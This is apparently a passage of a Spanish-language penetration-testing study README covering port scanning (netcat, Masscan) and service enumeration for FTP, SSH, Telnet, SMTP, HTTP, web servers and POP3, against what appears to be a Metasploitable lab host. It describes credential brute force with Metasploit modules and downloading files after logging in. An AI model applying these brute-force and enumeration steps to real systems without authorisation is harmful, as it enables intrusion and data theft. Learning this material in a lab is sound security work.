+<p> 5. Creación de servidores simples: &nbsp; &nbsp; Servidor de chat, servidor HTTP básico, etc.</p>
+
+
+<p> Netcat sirve para capturar banner-grabbing, los banners revelan con frecuencia el nombre del software y la versión que se ejecuta en ese puerto</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/gJvvgzYR/236.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion Masscan  ------------------------------------------------------------------------------------------------------------------>
+
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><h3 style="display: inline-block">🛠 Masscan </h3></summary>
+  </ul>
+</div>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/1RVY4YCM/masscan.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> MASSCAN es un escáner de puertos de alto rendimiento diseñado para escanear grandes redes (como toda Internet) en cuestión de minutos. A diferencia de Nmap, que es más preciso y detallado, Masscan se enfoca en la velocidad, utilizando un enfoque asíncrono y evitando el handshake TCP completo para lograr escaneos ultrarrápidos..</p>
+
+
+<p> Syntax: masscan [IP] -p [puertos] [--argumentos] </p>
+
+
+
+<p> Escaneo simple de puertos:</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/FFqbkrdJ/1.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> Escaneo de un rango de puertos:</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/t4bB7qwN/2.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p> Escaneo rango de IPs y exclusion de IPs:</p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/MpR8JpR0/3.png" alt="Descripción de la imagen">
+
+ </p>
+
+</br>
+<p> Otros tipos de escaneo</p>
+<p> Ajustar velocidad (--rate):&nbsp; masscan [IP] -p1-65535 --rate 100000 </p>
+<p> Guardar resultados:&nbsp; masscan [IP] -p80 -oX resultado.xml </p>
+
+
+<p>Opciones avanzadas</p>
+
+</br>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/tCZKF4r0/4.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion de servicios de RED ------------------------------------------------------------------------------------------------------------------>
+
+
+
+</br>
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=40&pause=1000&color=FF4E4E&width=800&height=500&lines=T1046+%3A+Network+Service+Discovery" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+</br>
+
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/MpMfrqmK/mitre.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+
+
+<h2> :arrow_right:  Descubrimiento de servicios de red </h2>
+
+</br>
+
+<p> Los adversarios pueden intentar obtener una lista de servicios que se ejecutan en hosts remotos y dispositivos de infraestructura de red local, incluidos aquellos que pueden ser vulnerables a la explotación remota de software. Los métodos comunes para adquirir esta información incluyen escaneos de puertos, vulnerabilidades y/o listas de palabras utilizando herramientas que se incorporan a un sistema.
+
+Dentro de entornos de nube, los adversarios pueden intentar descubrir servicios que se ejecutan en otros hosts de nube. Además, si el entorno de nube está conectado a un entorno local, los adversarios también pueden identificar servicios que se ejecutan en sistemas que no son de nube.
+
+Dentro de los entornos macOS, los adversarios pueden usar la aplicación nativa Bonjour para descubrir servicios que se ejecutan en otros hosts macOS dentro de una red. El demonio Bonjour mDNSResponder registra y anuncia automáticamente los servicios registrados de un host en la red. Por ejemplo, los adversarios pueden utilizar una consulta mDNS (dns-sd-b_ssh_tcp.) para econtrar otros sistemas que trasmiten el servicio SSH</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/g2gXJrcg/mitigacion.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<p> https://attack.mitre.org/techniques/T1046/> </p>
+
+
+
+<p>Su objetivo principal es descubrir qué servicios están corriendo, en qué puertos están escuchando, qué versiones de software utilizan y cómo están configurados.</p>
+
+
+<p>1.  Identificar servicios vulnerables: Al conocer la versión de un servicio, se pueden buscar vulnerabilidades conocidas asociadas a esa versión.</p>
+<p>2.  Determinar vectores de ataque: Por ejemplo, si un servicio como FTP o SMB está expuesto, podría ser explotado para ganar acceso inicial.</p>
+<p>3.  Mapear la red: Ayuda a entender la arquitectura de la red y cómo interactúan los sistemas entre sí.</p>
+
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion FTP ------------------------------------------------------------------------------------------------------------------>
+
+</br>
+
+
+<h2> :white_check_mark:  Enumeración FTP  </h2> 
+
+
+<h3> :radio_button: Puerto predeterminado 20 - 21  </h3> 
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/qvXjqsWy/CCA-Protocolo-FTP-1.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+
+<p> FTP (File Transfer Protocol) es un protocolo de red que permite la transferencia de archivos entre un cliente y un servidor. Utiliza dos canales: </p>
+
+<p> • Canal de control (puerto 21): Para comandos</p>
+<p> • Canal de datos (puerto 20 o dinámico): Para transferencia de archivos</p>
+
+<p> FTP maneja la autenticacion por lo tanto requiere nombre de usuario y contraseña obteniendo acceso al directorio que ha sido configurado, permitiendo la carga y descarga de archivos </p>
+
+
+<p> Nota: &nbsp; FTP no es cifrado se recomienda usar SFTP (puerto 22) no es un protocolo independiente, sino una subfunción del protocolo SSH por lo tanto opera dentro del canal seguro que establece SSH. Adicionalmente, Se requiere tener credenciales </p>
+
+
+<p> &nbsp; • SFTP (SSH Protocolo de transferencia de archivos) se ejecuta sobre SSH en el puerto 22 y cifra todo el tráfico. Este es el reemplazo más común para FTP.</p>
+<p> &nbsp; • FTPS (FTP Seguro) añade TLS cifrado al Protocolo FTP en el puerto 990 (implícito TLS) o utiliza STARTTLS en el puerto 21.</p>
+<p> &nbsp; • SCP (Protocolo de copia segura) también se ejecuta SSH, aunque está siendo desaprobado en favor del SFTP.</p>
+
+
+
+<h3> Anonymous FTP </h3>
+
+<p> Algunos servidores FTP permiten el inicio de sesión anónimo, normalmente utilizando el nombre de usuarioanonymous o ftp con cualquier dirección de correo electrónico como contraseña (o sin contraseña alguna). Anónimo FTP Se utilizó históricamente para la distribución de archivos públicos, como descargas de software y documentación. Durante las pruebas de penetración, pruebe siempre un inicio de sesión anónimo cuando descubra un FTP servidor</p>
+
+<p> Anónimo FTP Los servidores pueden contener archivos confidenciales que se expusieron accidentalmente, copias de seguridad de configuración o proporcionar una forma de cargar archivos maliciosos si el acceso de escritura está habilitado.</p>
+
+
+
+
+
+
+<h3> Objetivos de la enumeración FTP</h3>
+
+
+<p> Encontrar un FTP en Un servidor (especialmente uno que permita el inicio de sesión anónimo) es un hallazgo común y significativo. </p>
+
+
+<p> •&nbsp; Identificar usuarios válidos. </p> 
+<p> •&nbsp; Acceder a recursos compartidos.</p>
+<p> •&nbsp; Encontrar archivos sensibles (contraseñas, configuraciones, etc.). </p>
+<p> •&nbsp; Detectar configuraciones inseguras (permisos, modo anónimo, etc.). </p>
+<p> •&nbsp; Explotar vulnerabilidades conocidas en servidores FTP. </p>
+<p> •&nbsp; Carga y descarga masiva de archivos.</p> 
+
+</br>
+
+<p><b>Pasos</b></p>
+
+<p>1. Conocer la version del servidor FTP con el fin de saber si tiene vulnerabilidades que puedan ser explotadas </p>
+
+<p>2. Validar si el protocolo permite el acceso con el usuario anonymous </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/yx6Y70DR/1.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p>Iniciar sesion con el usuario Anonymous y contraseña default estableciendo comunicacion por el puerto 21 </p>
+<p>Visualizar los archivos a los cuales tenemos acceso con el usuario Anonymous </p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/PJHKJ5HC/2.png" alt="Descripción de la imagen">
+
+
+<p>3. Validar si el usuario con el que ingresa puede moverse libremente entre ficheros </p>
+<p>4. Validar si esta permitida la carga de ficheros con el usuario que se esta accediendo </p>
+
+
+<p><strong> Uso de herramientas dedicadas a enumeracion Nmap(script NSE) o modulos de Metasploit </strong></p>
+
+<p><b> Nmap(script NSE):</b>  Ver Scripts que sirven para enumerar el protocolo de FTP </p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/RZpSndwM/3.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<p> Con la ayuda de <b>Metasploit</b>  se puede realizar la enumeracion directa de solo el protocolo FTP con la ayuda de los modulos auxiliares </p>
+
+
+<p>1. Validar si el puerto FTP se encuentra abierto</p>
+<p>2. Realizar la configuracion de los paramentros necesarios para el escaneo</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/g0hMhrxL/159.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p>3. Realizar la busqueda de todo los modulos relacionados con FTP </p>
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/63NMfwRW/160.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p>Nota: se puede limitar la busqueda con el siguiente parametro: <b> search type:auxiliary name:FTP,</b>&nbsp; Lo cual enfoca la busqueda solo a los modulos auxliares pasando de un resultados de 565 a 46 </p>
+
+<p>4. Seleccionar el modulo que se requiere, en este caso la opcionde la version de FTP</p>
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/1XmMbHJY/161.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p>5.Realizar nuevamente la configuracion de los parametros para el nuevo modulo auxiliar </p>
+<p>6.Ejecutar </p>
+<p>7.Validar el resultado donde la herramienta informa la version de FTP que se esta ejecutando en el servidor, esta informacion es util por que podemos usarla para identificar vulnerabilidades para esa version en especifico </p>
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/Gm6Rr80P/162.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p>8. realizar la busqueda teniendo en cuenta la version del protocolo FTP que se esta usando en el servidor </p>
+
+<p>El resultado se podra usar en la fase de explotacion por medio del uso de exploit</p>
+
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/GpjXKVjr/163.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+  </br>
+
+<h3> :radio_button: &nbsp; Fuerza Bruta al protocolo FTP  </h3>
+
+<p> Se usa para identificar el nombre de usuario y contraseña </p>
+
+<p>1. Selecionar el modulo que corresponde </p>
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/jqPNRsp9/164.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p>2. Complemetar los parametros requeridos, seleccionr el diccionario que mejor se acomode al resultado que se espera </p>
+<p>3. Ejecutar </p>
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/527QsjzV/165.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p>4. Validar las coincidencias entre el resultado de ataque de fuerza bruta por diccionario y los usuarios de FTP </p>
+
+
+  <p align="center">
+
+ <img src="https://i.postimg.cc/nzqWmjsX/166.png" alt="Descripción de la imagen">
+
+ </p>
+
+<p>5. ingresar al servidor FTP con las credenciales identificadas</p>
+<p>6. Explorar y descargar los archivos de valor</p>
+
+
+  <p align="center">
+
+ <img src="https://i.postimg.cc/sDTN5R2g/167.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+ </br>
+
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion SSH ------------------------------------------------------------------------------------------------------------------>
+
+
+
+</br> 
+
+
+<h2> :white_check_mark: SSH Enumeration</h2> 
+
+
+
+<h3> :radio_button: Puerto predeterminado 22  </h3> 
+
+
+<p align="center">
+
+ <img src="xxxxx" alt="Descripción de la imagen">
+
+
+<p> SSH son las siglas de Secure SHell. Es un protocolo de red criptográfico que permite operar servicios de red de forma segura sobre un canal no seguro entre el cliente y el servidor.</p>
+
+<p> SSH utiliza el puerto 22 de forma predeterminada, sin embargo se puede configurar para utilizar en cualquier otro puerto</p>
+
+
+<h3> :radio_button: Pasos de enumeracion SSH</h3>
+
+
+
+<p> 1. Identificar la version de SSH que esta corriendo en el servidor</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/02GwmC72/188.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Resultado: SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 </p>
+
+
+<p> NOTA: No se evidencian Exploit disponibles para esta version de SSH en Metasploit </p>
+
+
+<p> Con ayuda de searchsploit podemos consultar los exploit disponibles </p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/xC6tKQ1t/208.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 2. El modulo <b> ssh_login </b>  Este módulo comprobará los inicios de sesión mediante SSH en una serie de equipos e informará de los inicios de sesión correctos. Si has cargado un complemento de base de datos y te has conectado a una base de datos, este módulo registrará los inicios de sesión
+  correctos y los hosts para que puedas realizar un seguimiento de tus accesos.</p>
+
+
+<p> • Fuerza bruta SSH </p>  
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/PqvkN6fD/209.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> • Establecer sesion con las credenciales explotadas </p> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/GpLzWRRW/215.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/ydWjNTkh/216.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion telnet  ------------------------------------------------------------------------------------------------------------------>
+
+
+</br>
+
+
+<h2> :white_check_mark:  Enumeración TELNET </h2> 
+
+
+
+<h3> :radio_button: Puerto predeterminado 23  </h3> 
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/XvYmMPZK/telnet.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> El protocolo TELNET (Teletype Network) fue desarrollado en 1969 para comunicarse con un sistema remoto a través de una interfaz de línea de comandos. Usa el puerto 23 de forma predeterminada</p>
+
+
+<p> Telnet es un protocolo de capa de aplicación que envía todos los datos en texto sin cifrar, incluidos nombres de usuario y contraseñas. Esto hace que sea trivial para cualquier persona con acceso al canal de comunicación interceptar las credenciales de inicio de sesión </p>
+
+
+<p> Como funciona </p>
+
+
+
+<p> Se solicita al usuario que proporcione su nombre de inicio de sesión (nombre de usuario).</p>
+<p> Luego se les pide la contraseñaD2xc9CgD. La contraseña no se muestra en la pantalla.</p>
+<p> Una vez que el sistema verifica las credenciales de inicio de sesión, el usuario recibe un mensaje de bienvenida.</p>
+<p> El servidor remoto otorga un símbolo del sistemafrank@bento:~$. $Indica que este no es un terminal raíz.</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/SKf0QP9v/249.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Todos los datos se envían en texto sin formato. Se capturó el tráfico generado por Telnet para encontrar la contraseña. La figura muestra los datos ASCII intercambiados entre el cliente y el sistema remoto. El texto en rojo es lo que envía el cliente, mientras que el texto en azul es lo que devuelve el sistema remoto. Observe cómo el nombre de usuario se repitió para mostrarlo en la terminal; sin embargo, la contraseña no lo era. En otras palabras, si alguien estuviera mirando la pantalla, no vería los caracteres de la contraseña. Sin embargo, esta protección visual no tiene sentido porque la contraseña todavía viaja a través de la red en texto sin cifrar.</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/WzQYwmrg/250.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p> A pesar de sus deficiencias de seguridad, el cliente telnet dispone de una propiedad útil para el reconocimiento. Debido a que opera a través de TCP, puede usarlo para conectarse a cualquier puerto TCP y observar la respuesta del servidor. Esta técnica se conoce como banner grabbing. Te conectas a un servicio y lees la respuesta inicial, llamada "banner", que el servidor envía de vuelta. Los banners revelan con frecuencia el nombre del software y la versión que se ejecuta en ese puerto.</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/KYcSGzWz/235.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+
+<!----------------------------------------------------------------------------- ## SMTP Enumeration ------------------------------------------------------------------------------------------------------------------>
+
+
+
+<h2> :white_check_mark: SMTP Enumeration</h2> 
+
+
+<h3> :radio_button: Puerto predeterminado 25  </h3> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/fRBD7mN1/210.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> SMTP son las siglas de Simple Mail Transfer Protocol (Protocolo Simple de Transferencia de Correo). Es el protocolo estándar utilizado para el envío de correo electrónico en Internet y en redes TCP/IP.</p>
+
+
+
+<h3> :radio_button: Componentes de entrega de correo electrónico </h3> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/J0TXYvNb/258.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> 1. Agente de usuario de correo (MUA): El cliente de correo electrónico (por ejemplo, Thunderbird, Outlook, una interfaz de correo web). </p>
+<p> 2. Agente de envío de correo (MSA): Recibe correo del MUA, comprueba si hay errores y lo reenvía. </p>
+<p> 3. Agente de transferencia de correo (MTA): Enruta y entrega correo entre servidores. </p>
+<p> 4. Agente de entrega de correo (MDA): Almacena el correo electrónico en el buzón del destinatario para recuperarlo. </p>
+
+
+<p> (SMTP) Se usa para enviar correo electrónico</p>
+<p> (POP3) o Protocolo de acceso a mensajes de Internet </p>
+<p> (IMAP) para recibir correo electrónico. </p>
+ 
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/qvZWML0C/211.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> La enumeracion SMTP es una técnica de reconocimiento utilizada en pruebas de penetración para extraer información de un servidor SMTP. Se aprovecha de los comandos del protocolo SMTP (principalmente VRFY, EXPN y RCPT TO) para descubrir usuarios válidos, alias de correo o direcciones de email en el servidor target. </p>
+
+
+
+
+<h3> :radio_button: Pasos de enumeracion SMTP</h3>
+
+
+
+<p> 1. Identificar la version de SMTP que esta corriendo en el servidor</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/tJYrs1jS/212.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Resultado: SMTP server version: 192.168.232.131:25 SMTP 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\x0d\x0a </p>
+
+
+<p> NOTA: No se evidencian Exploit disponibles para esta version de SMTP en Metasploit pero se pueden buscar en otras herramientas o plataformas </p>
+
+
+<p> 2. El modulo <b> smtp_enum </b> SMTP dispone de dos comandos internos que permiten la enumeración de usuarios: VRFY (que confirma los nombres de los usuarios válidos) y EXPN (que
+  revela las direcciones reales de los alias de los usuarios y las listas de correo (listas de distribución)). Mediante la ejecución de estos comandos SMTP se puede
+  obtener una lista de usuarios válidos. </p>
+
+
+<p> Realizar ataque de fuerza bruta </p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/mZpLJK6F/213.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Como resultado tenemos diferentes usuarios del sistema </p>
+
+
+</br>
+
+
+
+<!----------------------------------------------------------------------------- ## Enumeracion HTTP ------------------------------------------------------------------------------------------------------------------>
+
+
+
+</br>
+
+
+<h2> :white_check_mark:  Enumeración HTTP </h2> 
+
+
+<h3> :radio_button: Puerto predeterminado 80  </h3> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/mD7SGxFx/251.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> HTTP (Hypertext Transfer Protocol) es el protocolo fundamental de la web, utilizado para la comunicación entre clientes (navegadores) y servidores. Es un protocolo de capa de aplicación que sigue un modelo cliente-servidor y opera sobre TCP (generalmente puerto 80).</p>
+
+
+
+<h3> :radio_button: Métodos HTTP comunes</h3>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/5tBH4fnx/252.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Debido a que HTTP es un protocolo de texto sin cifrar, puede utilizar una herramienta sencilla como Telnet (o Netcat) para comunicarse con un servidor web y actuar como un "navegador web"</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/xC2qZqD1/253.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/4y4yJMxL/254.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> :radio_button: La enumeración HTTP consiste en: </p>
+
+
+
+<p> 1. Identificación del servidor y tecnologías</p>
+
+<p> &nbsp; ✅ Banner grabbing y cabeceras HTTP:</p>
+<p> &nbsp; ✅ Detección de tecnologías (CMS, frameworks, librerías):</p>
+
+
+<p> 2. Enumeración de directorios y archivos ocultos</p>
+
+<p> &nbsp; ✅ Fuzzing con dirb (rápido, wordlist por defecto):</p>
+<p> &nbsp; ✅ Fuzzing con gobuster (más rápido y flexible):</p>
+<p> &nbsp; ✅ Fuzzing con ffuf (el más rápido, ideal para pentest):</p>
+
+
+<p> 3. Métodos HTTP permitidos</p>
+
+
+<p>Métodos peligrosos que buscar:</p>
+
+<p> &nbsp; ✅ PUT → subida de archivos no autorizada</p>
+<p> &nbsp; ✅ DELETE → eliminación de recursos</p>
+<p> &nbsp; ✅ TRACE → posible XST (Cross-Site Tracing)</p>
+<p> &nbsp; ✅ CONNECT → tunneling HTTP</p>
+
+
+<p> 4. Enumeración de parámetros y endpoints API</p>
+
+<p> &nbsp; ✅ Fuzzing de rutas API:</p>
+<p> &nbsp; ✅ Búsqueda de archivos sensibles conocidos:</p>
+
+
+<p> 5. Scripts Nmap específicos para HTTP</p>
+
+
+<p> 6. Herramientas especializadas</p>
+
+<p> &nbsp; ✅ Nikto - escáner de vulnerabilidades web:</p>
+<p> &nbsp; ✅ WPScan (si es WordPress):</p>
+
+
+
+<p> Flujo recomendado para una enumeración HTTP completa</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/4y4yJMxL/254.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> telnet IP 80 te da control total a nivel TCP/HTTP raw para inspeccionar, manipular y probar el servidor web sin intermediarios. Es una herramienta simple pero muy poderosa para detectar configuraciones inseguras, smuggling, verb tampering y otras vulnerabilidades que herramientas automatizadas pueden pasar por alto.</p>
+
+
+<p><b> HTTP Versiones del protocolo</b></p>
+
+<p> :radio_button: <b> HTTP/1.1</b> Introdujo conexiones persistentes (que reutilizan la misma conexión TCP) y la cabecera Host obligatoria, lo que permitió el alojamiento virtual basado en nombres y redujo drásticamente el consumo de direcciones IP</p>
+<p> :radio_button: <b> HTTP/2  </b> introdujo multiplexación (múltiples solicitudes a través de una sola conexión), compresión de encabezado y envío al servidor. Es binario en lugar de basado en texto, lo que dificulta la interacción manual con Telnet.</p>
+<p> :radio_button: <b> HTTP/3  </b> usa QUIC (construido en UDP) en lugar de TCP, ofreciendo un rendimiento mejorado, especialmente en redes no confiables. Es cada vez más común en los principales sitios web.</p>
+
+
+<!----------------------------------------------------------------------------- ## Web Server Enumeration ------------------------------------------------------------------------------------------------------------------>
+
+</br> 
+
+
+<h2> :white_check_mark: Web Server Enumeration </h2> 
+
+
+<h3> :radio_button: Puerto predeterminado 80 - 443 </h3> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/Rhjx2TR7/171.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+
+<p>Un Web Server (servidor web) es un sistema que almacena, procesa y entrega páginas web a los clientes (navegadores) a través del protocolo HTTP/HTTPS. Cumple dos funciones principales: </p>
+
+<p> 1. Servir contenido estático – archivos HTML, CSS, JavaScript, imágenes, PDFs, etc. Los cuales almacenan en disco y se envían tal cual cuando un cliente los solicita.</p>
+
+<p> 2. Ejecutar aplicaciones dinámicas – mediante lenguajes como PHP, Python, Node.js o ASP.NET, el servidor web genera páginas personalizadas en tiempo real, a menudo consultando bases de datos.</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/4dSDh1jB/172.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/L6TVCs81/170.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Componentes claves </p>
+
+<p><b> HTTP Server </b> El software que escucha peticiones HTTP en un puerto (generalmente 80 o 443) y responde. Ejemplos: Apache, Nginx, IIS, Caddy.</p>
+<p><b> Sistema operativo </b>Donde corre el servidor web (Linux, Windows, etc.)</p>
+<p><b> Recursos </b>Los archivos y aplicaciones que el servidor expone.</p>
+<p><b> Conexión de red </b>Para recibir y responder peticiones de los clientes</p>
+
+
+<p> Informacion que se puede obtener al enumerar un web Server </p>
+
+
+<p>✅ Información del propio servidor web</p>
+<p>✅ Directorios y archivos ocultos/expuestos / herramientas como ffuf, gobuster, dirb o dirsearch.</p>
+<p>✅ Versionado de aplicaciones y CMS </p>
+<p>✅ Parámetros y endpoints de API / Mediante fuzzing de parámetros y enumeración de rutas API</p>
+<p>✅ Subdominios y virtual hosts</p>
+<p>✅ Redirecciones y cadena de proxies</p>
+<p>✅ Errores que filtran información</p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/52G1zbvh/173.png" alt="Descripción de la imagen">
+
+</p>
+
+<p>✅ Información de sesión y autenticación</p>
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/ZnVz5S4M/174.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p>✅ Framework y librerías del frontend</p>
+<p>✅ Información del entorno de desarrollo</p>
+
+
+
+<h3> :radio_button: Pasos de enumeracion WEB Server</h3>
+
+
+<p> 1. &nbsp; Identificar la version</p> 
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/bwJTzr5g/178.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> 2. &nbsp; Enumerar los encabezados HTTP</p> 
+
+<p> Los encabezados HTTP revelan información valiosa sobre la configuración del servidor, la tecnología subyacente y las medidas de seguridad implementadas.</p> 
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/8CgjZnLv/179.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 3. &nbsp; Enumerar Robots.txt</p> 
+
+<p> Los desarrolladores suelen listar ahí las rutas que no quieren que los motores de búsqueda indexen, precisamente porque contienen información sensible o funcionalidades administrativas</p> 
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/s2Ks5nc6/180.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Se evidencian 2 directorios </p> 
+
+<p> Con ayuda del comando CURL obtener el contenido de la URL transfiriendo los archivos </p> 
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/1tY4wfs0/181.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Se observa el codigo de respuesta 401 "Unauthorized" Indica que una solicitud web no fue procesada porque las credenciales de autenticación del usuario faltan, son incorrectas o han expirado, Lo que significa que este directorio en particular se encuentra protegido, por lo tanto podemos recurrir a un ataque de fuerza bruta  </p> 
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/zD6VfbdS/182.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 4. &nbsp; Validar si se encuetran mas directorios ocultos</p> 
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/nzBzBKX4/183.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Con ayuda del comando CURL obtener el contenido de la URL transfiriendo los archivos </p> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/nzBzBKX4/183.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/kXn4RbqG/184.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> 5. &nbsp; Buscar archivos especificos dentro del directorio </p> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/PxQC0zdt/185.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/x8sc1fJ2/186.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> 6. &nbsp; Realizar un ataque de fuerza bruta al directorio /secure identificado con la opcion de robots</p> 
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/c4G3rzgX/187.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/02GwmC72/188.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<!----------------------------------------------------------------------------- ## POP3 Post Office Protocol version 3------------------------------------------------------------------------------------------------------------------>
+
+
+</br> 
+
+
+<h2> :white_check_mark: POP3 Post Office Protocol version 3 </h2> 
+
+
+<h3> :radio_button: Puerto predeterminado 110  </h3> 
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/qv0v9j7n/259.png" alt="Descripción de la imagen">
+
+</p>
+
+
+ <p> Protocolo de Correos versión 3 (POP3) es un protocolo utilizado para descargar mensajes de correo electrónico de un agente de entrega de correo (MDA) servidor</p>
+
+
+
+  <p> El puerto 110 es el predeterminado POP3 puerto usando texto sin cifrar. Algunos servidores admiten actualizar la conexión a TLS usando el comando STLS (similar a STARTTLS en SMTP).</p>
+  <p> El puerto 995 se utiliza para POP3S (POP3sobre implícito TLS). La conexión está cifrada desde el principio.</p>
+
+
+
+ <h3> :radio_button: Comandos del protocolo POP3 </h3>
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/fbPSdpcV/260.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+ <p align="center">
+
+ <img src="https://i.postimg.cc/G3g3mGj4/261.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+  <p> La enumeración de POP3 consiste en el proceso de recopilar información de un servidor de correo que utiliza el protocolo POP3 (Post Office Protocol v3, puerto 110 o 995 con SSL/TLS) para identificar versiones del software, usuarios válidos, configuraciones inseguras y, si se logra autenticar, acceder al contenido de los buzones de correo.
+
